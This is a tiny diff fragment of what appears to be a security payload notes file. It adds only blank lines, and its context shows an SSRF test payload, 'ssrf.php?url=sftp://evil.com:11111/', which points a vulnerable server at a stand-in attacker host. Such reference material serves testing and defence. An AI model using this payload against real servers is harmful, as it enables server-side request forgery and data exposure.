@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:24:02.487868+00:00'
 ```powershell
 ssrf.php?url=sftp://evil.com:11111/
 ```
+
+
